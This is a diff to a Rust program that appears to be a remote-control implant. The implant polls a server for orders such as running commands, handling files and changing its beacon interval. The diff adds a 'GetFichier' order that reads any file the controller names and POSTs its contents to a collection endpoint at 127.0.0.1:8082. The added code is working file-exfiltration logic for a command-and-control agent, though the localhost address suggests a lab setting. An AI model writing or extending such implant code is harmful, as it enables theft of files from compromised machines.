@@ -5,7 +5,7 @@ use std::{
     process::{Command, Output},
     str
 };
-use reqwest;
+use reqwest::{header::CONTENT_TYPE};
 use serde::{Serialize, Deserialize};
 use bytes::Bytes;
 
@@ -14,6 +14,7 @@ use bytes::Bytes;
 enum OrdreType {
     Commande,
     Fichier,
+    GetFichier,
     Vitesse,
     Autre
 }
@@ -86,6 +87,10 @@ async fn sending_request(t : u64) -> Option<u64>{
                                         }
                                     }
                                 },
+                                OrdreType::GetFichier => {
+                                    let filename = v.arguments[0].as_str();
+                                    send_file(filename).await;
+                                }
                                 OrdreType::Vitesse => {
                                     let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
                                     return Some(new_vitesse);
@@ -115,6 +120,33 @@ async fn sending_request(t : u64) -> Option<u64>{
 
     thread::sleep(Duration::from_millis(t));
     return None;
+}
+
+
+async fn send_file(filename: &str) -> () {
+    let client = reqwest::Client::new();
+
+    let file = std::fs::read(filename).unwrap();
+
+    let response = client.post("http://127.0.0.1:8082")
+    .header(CONTENT_TYPE, "multipart/form-data")
+    .body(file)
+    .send()
+    .await;
+
+    match response{
+        Ok(v) => {
+            match v.status() {
+                reqwest::StatusCode::OK => {
+                    println!("{}", v.text().await.unwrap());
+                },
+                _ => {
+                    panic!("Uh oh! Something unexpected happened.");
+                }
+            };
+        },
+        Err(_err) => ()
+    };
 }
 
 
